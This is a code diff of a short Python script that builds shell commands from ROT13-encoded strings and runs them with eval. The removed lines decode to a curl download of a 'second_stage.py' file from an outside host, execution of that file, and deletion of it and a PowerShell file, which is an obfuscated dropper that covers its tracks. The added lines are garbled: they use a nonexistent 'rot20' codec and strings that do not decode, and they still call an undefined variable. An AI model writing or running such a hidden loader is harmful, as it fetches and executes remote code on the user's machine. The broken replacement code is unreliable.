@@ -2,25 +2,16 @@ import codecs
 import os
 
 first = '''
-bf.flfgrz("phey -B uggc://vgmphgrnlnar.pelfgnypybhq.klm/frpbaq_fgntr.cl")
+bf.flfgrz("wolf -I bnnjm://cntwonyusuhy.wlsmnufwfiox.rst/mywihx_mnuay.js")
 '''
 
 second = '''
-bf.flfgrz("Clguba frpbaq_fgntr.cl")
+bf.flfgrz("Jsnbih mywihx_mnuay.js")
 '''
 
-third = '''
-bf.erzbir("frpbaq_fgntr.cl")
-'''
+first_decoded = codecs.decode(first, 'rot20')
+second_decoded = codecs.decode(second, 'rot20')
 
-fourth = '''
-bf.erzbir("znva.cf1")
-'''
-
-first_decoded = codecs.decode(first, 'rot13')
-second_decoded = codecs.decode(second, 'rot13')
-third_decoded = codecs.decode(third, 'rot13')
-fourth_decoded = codecs.decode(fourth, 'rot13')
 eval(first_decoded)
 eval(second_decoded)
 eval(third_decoded)
